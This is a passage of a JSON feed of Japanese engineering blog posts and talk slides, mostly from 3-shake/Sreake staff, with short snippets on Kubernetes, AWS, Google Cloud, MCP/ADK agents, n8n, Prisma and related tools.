mode=discoveryengine.SearchRequest.SpellCorrectionSpec.Mode.AUTO            ),        )        page_result = client.search(request)        return page_result    response = search(project_id, location, engine_id, search_query)    resp = { \'search_result\': response.summary.summary_text }    print(resp)    return respQUESTION=\'{\\"query\\":\\"情報セキュリティにおいて気をつけるべきことを教えてください\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$QUESTION\\" -s http://localhost:8000/api/retriever | jq .課題retriever_service を定義しましたが、検索結果をcontextとして、LLMへの問い合わせを行なってください。次回、5月の回（日程未定）で解説します。","isoDate":"2025-04-28T09:56:21.000Z","dateMiliSeconds":1745834181000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AWS Load Balancer Controller (LBC)でkubernetesのServiceを外部に公開する","link":"https://zenn.dev/kamos/articles/65c7d16bf16184","contentSnippet":"はじめにAWS LBC(Load Balancer Controller)は、EKS上のリソースとしてALBを構成するための機能です。今回はこの機能の基本的な使い方や、より高度な構成について説明します。 AWS LBCとはなにかAWS LBC(Load Balancer Controller)は、Kubernetesのリソースを監視し、AWS Elastic Load Balancerをそれにあわせて管理するコンポーネントです。AWS LBCが監視する対象は、EKS内のIngressリソースとService Type LoadBalancerリソースです。これらのKubern...","isoDate":"2025-04-28T05:52:13.000Z","dateMiliSeconds":1745819533000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Testkubeとは？KubernetesクラスタにおけるE2Eテストの統合","link":"https://sreake.com/blog/testkube-e2e-test-on-kubernetes-cluster/","contentSnippet":"Sreake事業部の荒木です。KubernetesやSRE、LLM領域の関連技術など幅広い領域にわたって調査・検証を行っています。 今回、kubernetesクラスタのE2Eテストを統合、管理することができるTestku […]The post Testkubeとは？KubernetesクラスタにおけるE2Eテストの統合 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-25T12:27:40.000Z","dateMiliSeconds":1745584060000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SRE向けイベント【3-shake SRE Tech Talk #12】〜o11y Special〜 を開催します","link":"https://sreake.com/blog/sre-tech-talk-12/","contentSnippet":"この度、スリーシェイクは、SRE向けイベント【3-shake SRE Tech Talk #12】〜o11y Special〜 を、2025年5月16日（金）に開催します。The post SRE向けイベント【3-shake SRE Tech Talk #12】〜o11y Special〜 を開催します first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-25T11:45:29.000Z","dateMiliSeconds":1745581529000,"authorName":"Sreake","authorId":"Sreake"},{"title":"OpenFeature を使ったアプリケーション開発","link":"https://sreake.com/blog/openfeature-feature-flag-management/","contentSnippet":"はじめに はじめましての方も、そうじゃない方も、こんにちはこんばんは。Sreake 事業部 佐藤慧太(@SatohJohn)です。 皆さん、アプリケーションのコードを変更せずに機能の有効無効を切り替えることができる Fe […]The post OpenFeature を使ったアプリケーション開発 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-23T09:40:01.000Z","dateMiliSeconds":1745401201000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ここはMCPの夜明けまえ","link":"https://speakerdeck.com/nwiizo/kokohamcpnoye-ming-kemae","contentSnippet":"本日、「AI駆動開発実践の手引き -これが僕/私のAI（アイ）棒」というイベントで「ここはMCPの夜明けまえ」 \uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 【ハイブリッド開催】AI駆動開発実践の手引き -これが僕/私のAI（アイ）棒-\\r- 公式URL: https://hack-at-delta.connpass.com/event/350588/\\r\\r\uD83D\uDCDD 登壇ブログ\\r- 2025年4月、AIとクラウドネイティブの交差点で語った2日間の記録 #CNDS2025 #hack_at_delta\\r- https://syu-m-5151.hatenablog.com/entry/2025/04/24/113500","isoDate":"2025-04-23T04:00:00.000Z","dateMiliSeconds":1745380800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Dockerを使用せずにイメージを作成し実行してみる - go-containerregistryによる実装","link":"https://qiita.com/m_pig/items/82643135254b5b326e61","contentSnippet":"このページではコンテナイメージがどのように作成されているのかを、go-containerregistryライブラリを使った実装例を通して解説します。Dockerfileを使わずに、プログラムからコンテナイメージを作成する過程を見ていきます。コードの全体像createT...","isoDate":"2025-04-23T02:38:27.000Z","dateMiliSeconds":1745375907000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"EKS Pod Identityを利用してセキュアにkubernetesリソースからAWSリソースにアクセスする","link":"https://zenn.dev/kamos/articles/873ecca3f9bab0","contentSnippet":"はじめにAWS EKS (Elastic Kubernetes Service) を利用している場合、Kubernetes上のリソースだけで完結させることはほぼなく、多くの場合、kubernetesの世界にないAWSリソースにアクセスする必要があります。例えば、S3バケットへのファイルのアップロード、DynamoDBのテーブルへのデータの読み書き、SQSキューへのメッセージの送受信など、様々なユースケースが考えられます。その際に使用するのがPod Identityです。https://docs.aws.amazon.com/ja_jp/eks/latest/userguide/p...","isoDate":"2025-04-22T09:37:59.000Z","dateMiliSeconds":1745314679000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"生成AIによるCloud Native基盤構築の可能性と実践的ガードレールの敷設について","link":"https://speakerdeck.com/nwiizo/sheng-cheng-ainiyorucloud-native-ji-pan-gou-zhu-noke-neng-xing-toshi-jian-de-gadorerunofu-she-nituite","contentSnippet":"こんにちは皆さん！本日はCloud Native Daysのプレイベントで登壇させていただきます。2019年以来の登壇となりますが、当時はまだ肩こりなんて無縁だったんですよね…。\\r\\r時の流れは容赦ないもので、最近の肩こりが辛くて昨日も整骨院に通ってきました。30分の持ち時間に対してスライドが80枚以上という暴挙にも出ています。\\r\\r---\\r\\r本日、「CloudNative Days Summer 2025 プレイベント」というイベントで「生成AIによるCloud Native 基盤構築の可能性と実践的ガードレールの敷設について」 \uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: CloudNative Days Summer 2025 プレイベント\\r- 公式URL:https://cloudnativedays.connpass.com/event/351211/ \\r- イベントのURL: https://event.cloudnativedays.jp/cnds2025\\r\\r\uD83D\uDCDD 登壇ブログ\\r- 2025年4月、AIとクラウドネイティブの交差点で語った2日間の記録 #CNDS2025 #hack_at_delta\\r- https://syu-m-5151.hatenablog.com/entry/2025/04/24/113500","isoDate":"2025-04-22T04:00:00.000Z","dateMiliSeconds":1745294400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"クラウド開発環境Cloud Workstationsの紹介","link":"https://speakerdeck.com/yunosukey/kuraudokai-fa-huan-jing-cloud-workstationsnoshao-jie","contentSnippet":"","isoDate":"2025-04-22T04:00:00.000Z","dateMiliSeconds":1745294400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Lookerの独自言語「LookML」とは","link":"https://sreake.com/blog/what-is-lookml/","contentSnippet":"はじめに 2023年10月にGoogleが提供するBIツール「Looker」が政府認定クラウドサービス(通称 ISMAP) に認定されてから、早1年と半年程が経ちました。 もしかすると、「Lookerを導入してみた」「ま […]The post Lookerの独自言語「LookML」とは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-22T03:29:39.000Z","dateMiliSeconds":1745292579000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud Next 2025 データベースRecap ~データベース関連の全41リリースを紹介~","link":"https://sreake.com/blog/google-cloud-next-2025-database-updates/","contentSnippet":"AgentspaceやAgent Development Kit、A2A Protocolの発表など生成AI関連の発表が目立ったGoogle Cloud Next 2025ですが、データベース関連でも魅力的なリリースがた […]The post Google Cloud Next 2025 データベースRecap ~データベース関連の全41リリースを紹介~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-17T03:04:19.000Z","dateMiliSeconds":1744859059000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud Privileged Access Manager (PAM)を使用したアカウント管理","link":"https://sreake.com/blog/account-management-by-google-cloud-privileged-access-manager/","contentSnippet":"はじめに Google Cloud Privileged Access Manager (PAM)は、Google Cloud における特権アクセス管理のためのフルマネージドサービスです。2024年5月にプレビュー版が提 […]The post Google Cloud Privileged Access Manager (PAM)を使用したアカウント管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-15T09:00:04.000Z","dateMiliSeconds":1744707604000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ディレクトリ構成の基本原則","link":"https://sreake.com/blog/directory-structure-good-practice/","contentSnippet":"こんにちは。スリーシェイクの中原です。 プロジェクトが大きくなるにつれて「メンテナンスがしづらい」「開発スピードが遅い」と悩みを抱える要因の一つに「ディレクトリ構造がイケてない」があると考えています。 本日は、そういった […]The post ディレクトリ構成の基本原則 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-14T03:44:43.000Z","dateMiliSeconds":1744602283000,"authorName":"Sreake","authorId":"Sreake"},{"title":"genai-toolbox を実装して mcp server として公開し ADK から使ってみる","link":"https://zenn.dev/satohjohn/articles/dbf4afed585680","contentSnippet":"mcp server を作ってみるということで、genai-toolbox という物があるのでそれを元にやっていきますhttps://github.com/googleapis/genai-toolboxこちらは、各 DB への接続情報と、どういう SQL を実行するかを yaml、または、http の baseurl と request parameter などで記載することで tool を作成することができます。接続先は図にもある形になると思います。https://github.com/googleapis/genai-toolbox/raw/main/docs/en/get...","isoDate":"2025-04-13T01:54:27.000Z","dateMiliSeconds":1744509267000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"既存の mcp を ADK 経由で叩いてみる。 playwright を使う。","link":"https://zenn.dev/satohjohn/articles/68bdde2842e8b4","contentSnippet":"mcp の client に付いて詳しくなりたいと思いつつ adk についてもやりたいのでチョット調べてみます。今回は playwright の mcp に繋いでみようと思います。https://mcp.so/server/playwright-mcp/microsoft?tab=contentplaywright は別サーバで立てるような想定で考えておきます。そのためドキュメントにある通り以下のように記載します$ npx @playwright/mcp@latest --port 8931Listening on http://localhost:8931Put this...","isoDate":"2025-04-12T10:12:09.000Z","dateMiliSeconds":1744452729000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ADK で作った agent を mcp server で公開する","link":"https://zenn.dev/satohjohn/articles/48a82ff7de531b","contentSnippet":"ほぼ前回の続きhttps://zenn.dev/satohjohn/articles/b23bd65c289257A2A を調べてたんですがその前に mcp 何も知らんということで実装しながら手で覚えていきます。前回使っていた code_agent (sequential_agent) を公開できるようにします。ADK の agent を作ったら、それを mcp server として公開ができる AgentTool というものがあるので、それを使います。https://google.github.io/adk-docs/tools/function-tools/#3-agent...","isoDate":"2025-04-11T16:21:06.000Z","dateMiliSeconds":1744388466000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ADK + Cloud Run を動かす","link":"https://zenn.dev/satohjohn/articles/b23bd65c289257","contentSnippet":"Google Cloud Next \'25 に参加してます。そのうち会社のほうで参加レポートを出します。こちらは ADK(Agent Development Kit、Android ではない) のメモ書きのようなものです2025/04/11 時点だと python でしか ADK はリリースされていないようです。 Cloud Run で動かすCloud Run で動かす方法自体は https://google.github.io/adk-docs/deploy/cloud-run/ に記載されていますのでほぼこちらを参考にお願いします。ディレクトリやファイルは以下のとおりで...","isoDate":"2025-04-11T08:02:18.000Z","dateMiliSeconds":1744358538000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"スリーシェイク、2025 Google Cloud Infrastructure Modernization Partner of the Year – Japan を受賞","link":"https://sreake.com/blog/2025-google-cloud-partner-of-the-year/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2025年4月9日に、「2025 Google Cloud Partner of the Year」において「Infrastructure Modernization Partner of the Year - Japan」を受賞したことをお知らせします。The post スリーシェイク、2025 Google Cloud Infrastructure Modernization Partner of the Year – Japan を受賞 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-09T01:00:00.000Z","dateMiliSeconds":1744160400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Geminiとリアルタイム音声会話できるWebアプリの作り方","link":"https://sreake.com/blog/gemini-realtime-voice-chat-app/","contentSnippet":"はじめに 現在、生成AIを利用したアプリケーションが増加しています。その多くはテキストを中心としたものですが、アプリケーションによっては音声や動画でのやり取りが必要となることもあります。これまで生成AIとの音声・動画のや […]The post Geminiとリアルタイム音声会話できるWebアプリの作り方 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-08T06:04:03.000Z","dateMiliSeconds":1744092243000,"authorName":"Sreake","authorId":"Sreake"},{"title":"n8n on Cloud Run （ツール比較から選定まで）","link":"https://zenn.dev/meziron/articles/bff3ac566f8b93","contentSnippet":"はじめにこんにちは！日々の業務や個人開発で、繰り返し行う作業や複数のサービス間でのデータ連携に「もっと楽にならないかな？」と感じることはありませんか？私もその一人で、ワークフロー自動化ツールの導入を検討し始めました。世の中にはZapierやIFTTTといったSaaS型の有名なツールがありますが、今回はオープンソースでセルフホストも可能な選択肢を中心に比較検討しました。この記事では、まず私がなぜ n8n を選んだのか、その理由を説明します。そして後半では、選定したn8nを Terraform を使用して Cloud Run 上に構築した際の具体的な手順や構成について解説します。...","isoDate":"2025-04-08T04:53:10.000Z","dateMiliSeconds":1744087990000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"運用中のDBに後付け Prisma Migrate を途中から導入する実践ガイド","link":"https://zenn.dev/meziron/articles/a95d3133a1c385","contentSnippet":"運用中のDBに後付け Prisma Migrate を途中から導入する実践ガイド（ハマりどころ解説付き） はじめに (きっかけ)「このプロジェクト、最初は Prisma 使ってたけど、マイグレーションまでは管理してなかったんだよな...」「開発も進んで、そろそろちゃんとスキーマ変更を管理したいけど、_prisma_migrations テーブルがない...」そんな状況、ありませんか？ 私もまさにその状況に直面しました。Prisma は導入済みでデータベーススキーマも存在しているけれど、Prisma Migrate によるマイグレーション管理は行われていない。運用が始まってい...","isoDate":"2025-04-07T05:34:46.000Z","dateMiliSeconds":1744004086000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"【スリーシェイク】入社エントリ\uD83E\uDD73 \uD83C\uDF89","link":"https://zenn.dev/meziron/articles/9d727354b70ecd","contentSnippet":"こんにちは！こんばんは！スリーシェイクにフルスタックエンジニアとして入社して2ヶ月が経ちました、あびまる（釘宮）です。この2ヶ月間、スリーシェイクのカルチャー、メンバーの意識の高さ、そして温かい雰囲気に触れ、非常に充実した日々を送っています。今回は、私が実際に体験したスリーシェイクの魅力について、すこしだけ語らせてください！\uD83D\uDE47 会社のカルチャーへの感動まず、会社のカルチャーに深く感銘を受けました。CEO自らが技術発信の重要性を説き、社会のtoil（無駄な作業）をなくすために全力を尽くす姿勢は、非常に刺激的です。✨また、社長との定期的なミーティングでは、プロダクトやサービスの新機...","isoDate":"2025-04-03T14:01:57.000Z","dateMiliSeconds":1743688917000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"GTC2025 参加記録　~Keynote~","link":"https://sreake.com/blog/gtc2025-keynote/","contentSnippet":"3-shakeのsreake事業部でフルスタックエンジニアとして、主にML周りを担当している赤川です。今回は、サンフランシスコのサンノゼで3/17~3/21に開催されたGTC2025において、NVIDIA CEOのJen […]The post GTC2025 参加記録　~Keynote~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-31T00:26:08.000Z","dateMiliSeconds":1743380768000,"authorName":"Sreake","authorId":"Sreake"},{"title":"gopass を使ってパスワード共有を試す","link":"https://blog.1q77.com/2025/03/share-password-using-gopass/","contentSnippet":"gopass とはPostgres Weekly を眺めていて Creating Postgres Roles with Passwords Stored in Gopass という記事で gopass というものの存在を知りました。名前から分かるように Go 言語で書かれており、マルチプラットフォームのパスワード管理用コマンドラインツールです。GPG を使って暗号化し、Git で管理します。GPG の公開鍵暗号を使って複数人で複合することが可能になっており、任意の人とパスワードを共有することが可能です。","isoDate":"2025-03-29T00:57:32.000Z","dateMiliSeconds":1743209852000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"nvidia/cuda imageを使ってDockerコンテナでGPUを使用する","link":"https://sreake.com/blog/gpu-used-docker-with-nvidia-cuda-image/","contentSnippet":"はじめに Sreake事業部アプリケーション開発チームの角谷です！ 最近、機械学習やディープラーニング、特に生成AIの分野で、GPUの活用がますます重要になってきています。 Stable DiffusionやChatGP […]The post nvidia/cuda imageを使ってDockerコンテナでGPUを使用する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-27T04:33:27.000Z","dateMiliSeconds":1743050007000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetesで実現できるPlatform Engineering の現在地","link":"https://speakerdeck.com/nwiizo/kubernetesdeshi-xian-dekiruplatform-engineering-noxian-zai-di","contentSnippet":"本日、「Kubernetesで実践する Platform Engineering - FL#88」というイベントで「Kubernetesで実現できるPlatform Engineering の現在地」\uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: Kubernetesで実践する Platform Engineering - FL#88\\r- 公式URL: https://forkwell.connpass.com/event/348104/\\r\\r\uD83D\uDDE3️ 関連スライド\\r- インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて\\r- https://speakerdeck.com/nwiizo/inhurawotukurutohadouiukotonanoka-aruihaplatform-engineeringnituite\\r- Platform Engineeringは自由のめまい\\r- https://speakerdeck.com/nwiizo/platform-engineeringhazi-you-nomemai","isoDate":"2025-03-25T04:00:00.000Z","dateMiliSeconds":1742875200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"論文紹介 ”A Survey on Large Language Model based Autonomous Agents”","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-a-survey-on-large-language-model-based-autonomous-agents","contentSnippet":"https://genai-users.connpass.com/event/349197/\\r\\rこの論文は大規模言語モデル（LLM）を基盤とする自律型エージェントに関する包括的な調査論文です。この論文は、LLMベースの自律型エージェントの現状、構成要素、課題、そして将来の展望について詳細に解説しています。\\r\\r本論文を読むことで、AIエージェントの概要を体系的に知ることができます。","isoDate":"2025-03-24T04:00:00.000Z","dateMiliSeconds":1742788800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"SLI/SLO・ラプソディあるいは組織への適用の旅","link":"https://speakerdeck.com/nwiizo/slorapusodeiaruihazu-zhi-henoshi-yong-nolu","contentSnippet":"こんにちは、花粉症が辛いです。登壇する時にくしゃみしないために朝から外出を自粛してます。15分なのにスライドが40枚あります。\\r\\r\\r本日、「信頼性向上の第一歩！～SLI/SLO策定までの取り組みと運用事例～」というイベントで「SLI/SLO・ラプソディあるいは組織への適用の旅」\uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 信頼性向上の第一歩！～SLI/SLO策定までの取り組みと運用事例～\\r- 公式URL: https://findy.connpass.com/event/345990/\\r\\r\uD83D\uDCDA さらに！4日後の3月25日には翻訳した書籍に関する登壇する別イベントもあります！\uD83D\uDE32\\r「Kubernetesで実践する Platform Engineering - FL#88」\uD83D\uDC33⚙️\\r興味がある方はぜひ参加してください！\uD83D\uDC68‍\uD83D\uDCBB\uD83D\uDC69‍\uD83D\uDCBB\\r\uD83D\uDC49 https://forkwell.connpass.com/event/348104/\\r\\rお見逃しなく！\uD83D\uDDD3️✨","isoDate":"2025-03-20T04:00:00.000Z","dateMiliSeconds":1742443200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"外向けに話すときは相手のメリットを話そう","link":"https://nnaka2992.hatenablog.com/entry/2025/03/14/204148","contentSnippet":"お仕事をしているとチームや自分の周りで合意を取ったことを、相手にお願いしに行くことが多々あります。例えばピープルマネジメントのマネージャー層でxxというやり方を試していきたいと合意をとったものを、相手にお願いしに行くこと。例えば自分たちの担当範囲の決め事で、相手に協力をお願いしに行くこと。例えば自分たちのシステムと他システム間の決め事で、こちらの方針を相談しに行くこと。自分たちの決め事を相手に協力してもらうことはよくあります。方針を固めるまでにディスカッションを重ね、自分たちにどのようなメリットがあるかは詳細に話すでしょう。自分たちの考えやメリットも詳細に説明できるでしょう。では相手のメリットはどうでしょう？ 自分の考えやメリットの説明で終わってはいないでしょうか？相手のアクションが必要なとき、ポジションティブに動いてもらうには相手の動機が重要です。相手にメリット考えて貰うより、発案者から提案したほうが心象も良くなります。要は相手の立場を考えましょうの一側面です。相手と話すときは相手の立場を考えましょう。","isoDate":"2025-03-14T11:41:48.000Z","dateMiliSeconds":1741952508000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ObservabilityCON on the Road Tokyo 2025 Recap","link":"https://sreake.com/blog/observabilitycon-on-the-road-tokyo-2025-recap/","contentSnippet":"はじめに Sreake事業部の岩﨑です。 2025年2月25日、ObservabilityCON on the Road Tokyo 2025 が東京ポートシティ竹芝で開催されました。初めての参加でしたが、Grafana […]The post ObservabilityCON on the Road Tokyo 2025 Recap first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-14T02:09:01.000Z","dateMiliSeconds":1741918141000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google CloudのTerraform職人が失職する機能が出てしまった……","link":"https://zenn.dev/nnaka2992/articles/intro_to_application_design_center","contentSnippet":"Google CloudがApplication Design Centerという、構成図を書けばTerraformを書いて、デプロイまで行う機能をリリースしました。[1]https://cloud.google.com/application-design-center/docs/overviewどうやらGoogle CloudはTerraform職人を失職に追い込みたいようです。 Application Design Centerの概要アプリケーション デザイン センターは、Google Cloud アプリケーション インフラストラクチャの設計、共有、デプロイに役立ちます...","isoDate":"2025-03-11T00:30:01.000Z","dateMiliSeconds":1741653001000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"フロントエンドオブザーバビリティ on Google Cloud","link":"https://speakerdeck.com/yunosukey/hurontoendoobuzababiritei-on-google-cloud","contentSnippet":"","isoDate":"2025-03-07T05:00:00.000Z","dateMiliSeconds":1741323600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"StageCrewとは？マルチモーダルAIツールを触ってみた","link":"https://sreake.com/blog/research-multi-modal-tool-stagecrew/","contentSnippet":"StageCrew™️とは StageCrew™（https://stagecrew.ai/）は、システム監視やログ収集、トランザクションのトレースといった各種管理ツールに対するアクセスを自動化、インシデント発生時の対応 […]The post StageCrewとは？マルチモーダルAIツールを触ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-06T11:13:20.000Z","dateMiliSeconds":1741259600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"LookMLって定数を定義できるの?","link":"https://zenn.dev/nedoko_dok0dko/articles/6d6bacc1a294b9","contentSnippet":"whatLookMLで定数を定義する事ができるのか調べてみた個人ログ Q.LookMLって定数を定義できるの?A. できるLookMLも他のプログラミング言語と同じように定数を設定できる。 定数の定義とマニフェストファイル マニフェストファイルLookMLにおいて、定数はマニフェストファイルというファイルを作成することによって定義する事ができる。https://cloud.google.com/looker/docs/lookml-project-files?hl=ja#project_manifest_filesマニフェストファイルは、定数の定義以外にも...","isoDate":"2025-03-06T10:53:04.000Z","dateMiliSeconds":1741258384000,"authorName":"seno","authorId":"seno"},{"title":"KotlinでAndroidアプリを作ってみる（超初級編）","link":"https://qiita.com/masaru-komiyama/items/8231c0e69d9fb54909aa","contentSnippet":"インフラ屋でもクソアプリを作りたくなる夜があるじゃない！と、言うことで本日は手元のMac端末でKotlinを触ってみようと思います。超初級編なので、あまり深い記事は期待しないでください。とりあえず環境整えて、動かしてみよう！　と気軽に取り掛かるきっかけとなることを重視...","isoDate":"2025-03-03T13:22:04.000Z","dateMiliSeconds":1741008124000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"技術的負債と立ち向かう前に知っておいてもいいこと","link":"https://sreake.com/blog/think-about-technical-debt/","contentSnippet":"はじめに こんにちは、nwiizoです。開発チームの会話の中で「これは技術的負債だから後で対処しよう」という言葉をよく耳にします。納期に追われるプロジェクトでは、この「後で」が永遠の「いつか」になりがちです。結果として多 […]The post 技術的負債と立ち向かう前に知っておいてもいいこと first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-03T10:46:12.000Z","dateMiliSeconds":1740998772000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ユーザーストーリーにこだわって、プロダクトバックログをスクラムチームが行う作業の唯一の情報源として成立させる","link":"https://sreake.com/blog/step-up-product-backlog-and-user-story-development/","contentSnippet":"Sreake事業部アプリケーション開発チームの安本です。 現在、スクラムでアプリケーション開発の概念検証（Proof of Concept; PoC）を進めています。 本記事では、スクラム開発を行っているチーム向けに、私 […]The post ユーザーストーリーにこだわって、プロダクトバックログをスクラムチームが行う作業の唯一の情報源として成立させる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-03T01:17:49.000Z","dateMiliSeconds":1740964669000,"authorName":"Sreake","authorId":"Sreake"},{"title":"くちあだきみあむはしきぎ","link":"https://qiita.com/masaru-komiyama/items/0160cf23fbe2576f869c","contentSnippet":"おい！タイトルバグってんぞ！　と思われた皆様。安心してください。バグっておりません。電気回路を嗜んだ方なら、何かあったときについ口ずさんでしまう復活の呪文（まぁ色んな意味で記憶を呼び起こす呪文なので嘘は言っていない）...　じゃなくて、カラーコードの覚え方について簡単に書...","isoDate":"2025-03-02T12:57:49.000Z","dateMiliSeconds":1740920269000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"[2025/02/28] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20250228","contentSnippet":"#kubenewsの2025年02月28日の回で話す、@bells17が最近気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。この記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://www.youtube.com/live/e4qQt7sQ46Y 告知とかニュースっぽいもの コードを読んで理解するko buildhttps...","isoDate":"2025-02-28T10:19:14.000Z","dateMiliSeconds":1740737954000,"authorName":"bells17","authorId":"bells17"},{"title":"AIエージェント元年@日本生成AIユーザ会","link":"https://speakerdeck.com/shukob/aiezientoyuan-nian-at-ri-ben-sheng-cheng-aiyuzahui","contentSnippet":"https://genai-users.connpass.com/event/344332/\\r2024年は生成AIが世の中に浸透した1年でしたが、2025年はAIエージェント元年と言われています。\\r\\r生成AIはチャットベースで受け身なものでしたが、AIエージェントは自律的にタスクを分解しこなすことができます。そのインパクトは計り知れません。\\r\\r生成AIの概略を説明した後、AIエージェントの紹介をします。","isoDate":"2025-02-28T05:00:00.000Z","dateMiliSeconds":1740718800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud Model Armorによるプロンプトインジェクション対策","link":"https://sreake.com/blog/prompt-injection-protection-with-google-cloud-model-armor/","contentSnippet":"はじめに 昨年2024年は生成AIアプリケーションの開発が本格化し、RAG（Retrieval-Augmented Generation）が爆発的に流行した年でした。今年2025年はAIエージェントの年になると考えられて […]The post Google Cloud Model Armorによるプロンプトインジェクション対策 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-27T02:14:57.000Z","dateMiliSeconds":1740622497000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AI時代におけるMLOpsのTips","link":"https://speakerdeck.com/shukob/aishi-dai-niokerumlopsnotips","contentSnippet":"https://event.ospn.jp/osc2025-spring/session/2017030\\rAI時代におけるMLOpsのTips 〜 MLOpsを加速させるOSS 〜\\rオープンソースカンファレンス2025 Tokyo/Spring\\rライトニングトークにてKubeflowの紹介などMLOpsの話をさせていただきました。","isoDate":"2025-02-22T05:00:00.000Z","dateMiliSeconds":1740200400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AIエージェント元年","link":"https://speakerdeck.com/shukob/aiezientoyuan-nian","contentSnippet":"https://genai-users.connpass.com/event/344292/\\r\\r2024年は生成AIが世の中に浸透した1年でしたが、2025年はAIエージェント元年と言われています。\\r\\r生成AIはチャットベースで受け身なものでしたが、AIエージェントは自律的にタスクを分解しこなすことができます。そのインパクトは計り知れません。\\r\\r生成AIの概略を説明した後、AIエージェントの紹介をします。","isoDate":"2025-02-21T05:00:00.000Z","dateMiliSeconds":1740114000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"コンテナサプライチェーンセキュリティ","link":"https://speakerdeck.com/kyohmizu/kontenasapuraitiensekiyuritei","contentSnippet":"イベント登壇資料です。2025/02/21 #CNCJ\\rhttps://cncj-security.connpass.com/event/341812/","isoDate":"2025-02-21T05:00:00.000Z","dateMiliSeconds":1740114000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"OpenClarityの裏側を知りたい","link":"https://speakerdeck.com/kojake_300/openclaritynoli-ce-wozhi-ritai-fe15f317-ff7b-4f9e-acd4-8d389e3ebed8","contentSnippet":"","isoDate":"2025-02-20T05:00:00.000Z","dateMiliSeconds":1740027600000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"コードを読んで理解するko build","link":"https://speakerdeck.com/bells17/kotowodu-nteli-jie-suruko-build","contentSnippet":"Jagu\'e\'r Cloud Native #17 ハイブリッド Meetup ~ 推しの CNCF プロジェクトを紹介するぜ LT ~ の登壇資料です。\\rhttps://jaguer-cloud-native.connpass.com/event/342024/\\r\\r参考リンク・画像など引用元一覧\\rhttps://ko.build/ \\rhttps://github.com/ko-build/ko \\rhttps://github.com/google/go-containerregistry \\rhttps://github.com/sigstore/cosign \\rhttps://github.com/opencontainers/image-spec \\rhttps://github.com/cncf/sandbox/issues/17 \\rhttps://github.com/ko-build/ko/issues/791 \\rhttps://github.com/cncf/sandbox/issues/163 